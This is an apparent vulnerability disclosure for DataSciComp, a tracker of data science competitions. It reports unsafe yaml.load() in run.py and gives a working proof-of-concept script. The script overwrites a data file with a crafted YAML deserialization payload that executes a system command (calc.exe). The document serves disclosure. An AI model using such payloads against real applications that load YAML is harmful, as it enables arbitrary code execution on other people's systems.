## ✍️ Description
A collection of popular Data Science Challenges/Competitions || Countdown timers to keep track of the entry deadlines.
* **Vulnerability description**
Vulnerable to YAML deserialization attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
```
# vulnerable part of code
yaml.load() in run.py is responsible for code execution.
https://github.com/iphysresearch/DataSciComp/blob/master/run.py#L46
```
```python
# exploit.py
import os
os.system("git clone https://github.com/iphysresearch/DataSciComp.git")
os.chdir("DataSciComp/_data/")
payload = """title: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
os.system("rm _effective_kaggle.yaml")
open("_effective_kaggle.yaml","w+").write(payload)
os.chdir("../")
print(os.getcwd())
os.system("python3 run.py")
```
![](https://user-images.githubusercontent.com/43377443/105618821-b6d80f00-5e11-11eb-8a2c-b259cae61cd8.PNG)
